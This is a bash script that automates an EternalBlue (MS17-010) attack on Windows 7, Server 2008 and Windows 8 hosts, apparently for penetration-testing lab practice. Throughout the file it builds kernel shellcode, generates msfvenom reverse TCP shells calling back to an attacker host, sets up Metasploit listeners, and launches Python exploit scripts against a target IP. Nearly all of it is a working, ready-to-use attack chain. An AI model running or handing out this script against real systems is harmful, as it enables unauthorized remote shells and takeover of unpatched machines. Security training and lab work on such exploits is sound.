echo Hello and Welcome.
# Usage: manualblue.sh LHOST 64_LPORT 86_LPORT TARGETIP TARGET_TYPE
#Target type 0 is Windows7/Server 2008
#Type 1 is Windows 8

LHOST=$1
X64PORT=$2
X86PORT=$3
TARGETIP=$4
TARGETTYPE=$5

nasm -f bin eternalblue_kshellcode_x64.asm -o sc_x64_kernel.bin
nasm -f bin eternalblue_kshellcode_x86.asm -o sc_x86_kernel.bin

touch config.rc
echo use exploit/multi/handler > config.rc
echo set PAYLOAD windows/x64/shell/reverse_tcp >> config.rc
echo set LHOST $LHOST >> config.rc
echo set LPORT $X64PORT >> config.rc
echo set ExitOnSession false >> config.rc
echo set EXITFUNC thread >> config.rc
echo exploit -j >> config.rc
echo set PAYLOAD windows/shell/reverse_tcp >> config.rc
echo set LPORT $X86PORT >> config.rc
echo exploit -j >> config.rc

echo Generating x64 rev shell on port $X64PORT...
echo
msfvenom -p windows/x64/shell/reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=$LHOST LPORT=$X64PORT
echo
echo Generating x86 rev shell on port $X86PORT...
echo
msfvenom -p windows/shell/reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=$LHOST LPORT=$X86PORT
echo
cat sc_x64_kernel.bin sc_x64_msf.bin > sc_x64.bin
cat sc_x86_kernel.bin sc_x86_msf.bin > sc_x86.bin
python eternalblue_sc_merge.py sc_x86.bin sc_x64.bin sc_all.bin
echo Done with shell prep. Get ready to try harder.
echo
startListeners='
/etc/init.d/postgresql start
msfconsole -r config.rc
/etc/init.d/postgresql stop
rm config.rc'
echo "$startListeners" | xclip -selection c
echo Open a split terminal here, and paste in what has been copied to your clipboard to start your listeners.
echo "Once they are listening, type 'HitFix' to begin the exploit."
read HitFixCheck
if [[ $HitFixCheck -eq HitFix ]]
then
	if [[ $TARGETTYPE -eq 0 ]]
	then
		python eternalblue_exploit7.py $TARGETIP sc_all.bin
	elif [[ $TARGETTYPE -eq 1 ]]
	then
		python eternalblue_exploit8.py $TARGETIP sc_all.bin
	else
		echo Restart, something went wrong.
	fi
	echo Exploit launched, check handler now.
else
	echo Restart, something is wrong.
fi






